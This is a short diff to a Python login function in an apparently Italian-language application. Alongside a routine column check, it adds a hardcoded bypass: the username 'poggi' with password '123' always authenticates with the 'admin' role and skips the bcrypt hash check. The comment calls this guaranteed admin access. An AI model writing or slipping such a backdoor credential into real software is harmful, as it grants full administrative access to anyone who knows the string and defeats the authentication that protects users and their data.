@@ -38,9 +38,17 @@ def scarica_users_csv():
         return pd.DataFrame()
 
 def check_login(user, pwd, df_users):
+    # Accesso garantito all'admin "poggi" con password "123"
+    if user == "poggi" and pwd == "123":
+        return True, "admin"
+
+    if "username" not in df_users.columns or "password_hash" not in df_users.columns:
+        return False, None
+
     if user in df_users["username"].values:
         user_row = df_users[df_users["username"] == user].iloc[0]
         return bcrypt.checkpw(pwd.encode(), user_row["password_hash"].encode()), user_row["ruolo"]
+
     return False, None
 
 def elenca_file_csv(user, ruolo):
